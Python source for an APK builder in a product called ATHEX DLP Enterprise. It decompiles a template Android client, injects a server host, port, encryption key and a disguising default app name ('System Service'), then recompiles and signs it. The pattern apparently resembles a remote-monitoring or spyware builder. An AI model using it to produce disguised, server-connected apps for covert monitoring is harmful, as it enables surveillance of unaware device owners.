"""
ATHEX DLP Enterprise - APK Builder Engine
==========================================
Main APK building engine that orchestrates the complete build process.
"""

import os
import sys
import json
import shutil
import hashlib
import subprocess
import tempfile
import logging
from pathlib import Path
from datetime import datetime
from typing import Dict, Optional, Tuple

from .injector import ConfigInjector
from .signer import APKSigner
from config import Config

logger = logging.getLogger(__name__)


class APKBuilder:
    """
    Main APK Builder class that manages the complete build pipeline.
    
    Pipeline:
    1. Copy template APK
    2. Decompile with apktool
    3. Inject server configuration
    4. Recompile APK
    5. Sign APK
    6. Output to downloads folder
    """
    
    def __init__(self):
        """Initialize APK Builder"""
        self.config = Config()
        self.injector = ConfigInjector()
        self.signer = APKSigner()
        
        # Paths
        self.template_dir = self.config.APK_TEMPLATE_DIR
        self.output_dir = self.config.APK_OUTPUT_DIR
        self.temp_dir = Path(tempfile.mkdtemp(prefix="athex_build_"))
        
        # Tools
        self.apktool_path = self.config.APK_TOOL_PATH
        self.signer_path = self.config.SIGNER_PATH
        
        # Ensure output directory exists
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # Build statistics
        self.build_count = 0
        self.last_build_time = None
        
        logger.info("APK Builder initialized")
    
    def build_apk(self, 
                  server_host: str = "127.0.0.1",
                  server_port: int = 22533,
                  app_name: str = "System Service",
                  features: Dict = None,
                  encryption_key: str = None) -> Dict:
        """
        Build a custom APK with injected configuration.
        
        Args:
            server_host: Target server IP/hostname
            server_port: Target server port
            app_name: Display name for the app
            features: Dictionary of features to enable/disable
            encryption_key: Custom encryption key
            
        Returns:
            Dictionary with build result
        """
        
        build_id = self._generate_build_id(server_host, server_port, app_name)
        build_dir = self.temp_dir / build_id
        build_dir.mkdir(parents=True, exist_ok=True)
        
        result = {
            "success": False,
            "build_id": build_id,
            "server_host": server_host,
            "server_port": server_port,
            "app_name": app_name,
            "timestamp": datetime.now().isoformat(),
            "steps": []
        }
        
        try:
            logger.info(f"Starting APK build: {build_id}")
            logger.info(f"  Server: {server_host}:{server_port}")
            logger.info(f"  App Name: {app_name}")
            
            # Step 1: Validate inputs
            self._validate_inputs(server_host, server_port, app_name)
            result["steps"].append({"step": "validate", "status": "ok"})
            
            # Step 2: Copy template
            template_source = self._get_template_source()
            result["steps"].append({"step": "copy_template", "status": "ok"})
            
            # Step 3: Decompile with apktool
            decompiled_dir = self._decompile_apk(template_source, build_dir)
            result["steps"].append({"step": "decompile", "status": "ok"})
            
            # Step 4: Inject configuration
            self._inject_configuration(decompiled_dir, {
                "server_host": server_host,
                "server_port": server_port,
                "app_name": app_name,
                "encryption_key": encryption_key or self.config.ENCRYPTION_KEY,
            }, features)
            result["steps"].append({"step": "inject", "status": "ok"})
            
            # Step 5: Recompile APK
            unsigned_apk = self._recompile_apk(decompiled_dir, build_dir)
            result["steps"].append({"step": "recompile", "status": "ok"})
            
            # Step 6: Sign APK
            signed_apk = self._sign_apk(unsigned_apk, build_dir)
            result["steps"].append({"step": "sign", "status": "ok"})
            
            # Step 7: Copy to output
            output_apk = self._copy_to_output(signed_apk, build_id)
            result["steps"].append({"step": "output", "status": "ok"})
            
            # Success
            result["success"] = True
            result["apk_path"] = str(output_apk)
            result["apk_size"] = output_apk.stat().st_size
            result["apk_size_formatted"] = self._format_size(output_apk.stat().st_size)
            result["download_url"] = f"/api/apk/download/{build_id}"
            
            self.build_count += 1
            self.last_build_time = datetime.now()
            
            logger.info(f"✅ Build successful: {output_apk}")
            logger.info(f"   Size: {result['apk_size_formatted']}")
            
        except Exception as e:
            logger.error(f"Build failed: {e}")
            result["error"] = str(e)
            result["steps"].append({"step": "error", "status": "failed", "error": str(e)})
        
        finally:
            # Cleanup temp files
            self._cleanup_build_dir(build_dir)
        
        return result
    
    def _validate_inputs(self, host: str, port: int, name: str):
        """Validate build inputs"""
        if not host or len(host) < 1:
            raise ValueError("Server host is required")
        
        if not isinstance(port, int) or port < 1 or port > 65535:
            raise ValueError(f"Invalid port: {port}")
        
        if not name or len(name) < 1:
            raise ValueError("App name is required")
        
        if len(name) > 50:
            raise ValueError("App name too long (max 50 characters)")
        
        logger.debug("Input validation passed")
    
    def _generate_build_id(self, host: str, port: int, name: str) -> str:
        """Generate unique build ID"""
        raw = f"{host}:{port}:{name}:{datetime.now().timestamp()}"
        return hashlib.md5(raw.encode()).hexdigest()[:12]
    
    def _get_template_source(self) -> Path:
        """Get the APK template source"""
        # Check if template directory exists
        if self.template_dir.exists():
            # Look for decompiled template
            template_files = list(self.template_dir.glob("*.apk"))
            if template_files:
                return template_files[0]
            
            # Check for decompiled source
            if (self.template_dir / "AndroidManifest.xml").exists():
                return self.template_dir
        
        # If no template, use the android_client directory
        android_client_dir = Config.BASE_DIR / "android_client"
        if android_client_dir.exists():
            logger.info("Using android_client as template source")
            return android_client_dir
        
        raise FileNotFoundError(
            f"No APK template found. Place base.apk in {self.template_dir} "
            f"or ensure android_client/ exists."
        )
    
    def _decompile_apk(self, template_source: Path, build_dir: Path) -> Path:
        """Decompile APK using apktool"""
        decompiled_dir = build_dir / "decompiled"
        decompiled_dir.mkdir(exist_ok=True)
        
        # If source is already decompiled (directory with AndroidManifest.xml)
        if template_source.is_dir() and (template_source / "AndroidManifest.xml").exists():
            logger.info("Template is already decompiled, copying...")
            shutil.copytree(template_source, decompiled_dir, dirs_exist_ok=True)
            return decompiled_dir
        
        # If source is an APK file
        if template_source.suffix == ".apk":
            logger.info(f"Decompiling APK: {template_source}")
            
            if not self.apktool_path.exists():
                raise FileNotFoundError(f"apktool not found: {self.apktool_path}")
            
            cmd = [
                "java", "-jar", str(self.apktool_path),
                "d", str(template_source),
                "-o", str(decompiled_dir),
                "-f"  # Force overwrite
            ]
            
            try:
                result = subprocess.run(
                    cmd, 
                    capture_output=True, 
                    text=True, 
                    timeout=120
                )
                
                if result.returncode != 0:
                    raise RuntimeError(f"apktool decompile failed:\n{result.stderr}")
                
                logger.info("APK decompiled successfully")
                
            except subprocess.TimeoutExpired:
                raise RuntimeError("apktool decompile timed out (120s)")
            
            return decompiled_dir
        
        raise ValueError(f"Invalid template source: {template_source}")
    
    def _inject_configuration(self, decompiled_dir: Path, config: Dict, features: Dict = None):
        """Inject configuration into decompiled APK"""
        logger.info("Injecting configuration...")
        
        self.injector.inject_all(
            decompiled_dir=decompiled_dir,
            server_host=config["server_host"],
            server_port=config["server_port"],
            app_name=config["app_name"],
            encryption_key=config.get("encryption_key", ""),
            features=features
        )
        
        logger.info("Configuration injected successfully")
    
    def _recompile_apk(self, decompiled_dir: Path, build_dir: Path) -> Path:
        """Recompile APK from decompiled source"""
        unsigned_apk = build_dir / "unsigned.apk"
        
        logger.info(f"Recompiling APK...")
        
        if not self.apktool_path.exists():
            raise FileNotFoundError(f"apktool not found: {self.apktool_path}")
        
        cmd = [
            "java", "-jar", str(self.apktool_path),
            "b", str(decompiled_dir),
            "-o", str(unsigned_apk),
            "-f"  # Force overwrite
        ]
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120
            )
            
            if result.returncode != 0:
                raise RuntimeError(f"apktool recompile failed:\n{result.stderr}")
            
            logger.info(f"APK recompiled: {unsigned_apk}")
            
        except subprocess.TimeoutExpired:
            raise RuntimeError("apktool recompile timed out (120s)")
        
        return unsigned_apk
    
    def _sign_apk(self, unsigned_apk: Path, build_dir: Path) -> Path:
        """Sign the APK"""
        signed_apk = build_dir / "signed.apk"
        
        logger.info("Signing APK...")
        
        self.signer.sign_apk(
            input_apk=unsigned_apk,
            output_apk=signed_apk,
            keystore_path=self.config.KEYSTORE_PATH,
            keystore_pass=self.config.KEYSTORE_PASS,
            key_alias=self.config.KEY_ALIAS,
            key_pass=self.config.KEY_PASS
        )
        
        logger.info(f"APK signed: {signed_apk}")
        
        return signed_apk
    
    def _copy_to_output(self, signed_apk: Path, build_id: str) -> Path:
        """Copy signed APK to output directory"""
        output_apk = self.output_dir / f"ATHEX_DLP_{build_id}.apk"
        
        shutil.copy2(signed_apk, output_apk)
        
        logger.info(f"APK copied to output: {output_apk}")
        
        return output_apk
    
    def _cleanup_build_dir(self, build_dir: Path):
        """Clean up temporary build directory"""
        try:
            if build_dir.exists():
                shutil.rmtree(build_dir, ignore_errors=True)
        except Exception as e:
            logger.warning(f"Failed to cleanup build dir: {e}")
    
    def _format_size(self, size_bytes: int) -> str:
        """Format file size to human readable"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size_bytes < 1024:
                return f"{size_bytes:.1f} {unit}"
            size_bytes /= 1024
        return f"{size_bytes:.1f} TB"
    
    def get_build_stats(self) -> Dict:
        """Get build statistics"""
        return {
            "total_builds": self.build_count,
            "last_build": self.last_build_time.isoformat() if self.last_build_time else None,
            "output_directory": str(self.output_dir),
            "apk_tool_available": self.apktool_path.exists(),
            "signer_available": self.signer_path.exists() if hasattr(self, 'signer_path') else False
        }
    
    def list_built_apks(self) -> list:
        """List all built APKs"""
        apks = []
        if self.output_dir.exists():
            for apk_file in self.output_dir.glob("*.apk"):
                apks.append({
                    "filename": apk_file.name,
                    "path": str(apk_file),
                    "size": apk_file.stat().st_size,
                    "size_formatted": self._format_size(apk_file.stat().st_size),
                    "created": datetime.fromtimestamp(apk_file.stat().st_ctime).isoformat()
                })
        
        return sorted(apks, key=lambda x: x["created"], reverse=True)
    
    def cleanup(self):
        """Clean up temporary files"""
        try:
            if self.temp_dir.exists():
                shutil.rmtree(self.temp_dir, ignore_errors=True)
                logger.info("Temporary files cleaned up")
        except Exception as e:
            logger.warning(f"Cleanup error: {e}")


# ============================================================
# TEST
# ============================================================
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    builder = APKBuilder()
    
    # Print stats
    print("\n📊 Build Stats:")
    stats = builder.get_build_stats()
    for key, value in stats.items():
        print(f"  {key}: {value}")
    
    # List existing APKs
    print("\n📦 Existing APKs:")
    apks = builder.list_built_apks()
    if apks:
        for apk in apks:
            print(f"  📱 {apk['filename']} ({apk['size_formatted']})")
    else:
        print("  No APKs found")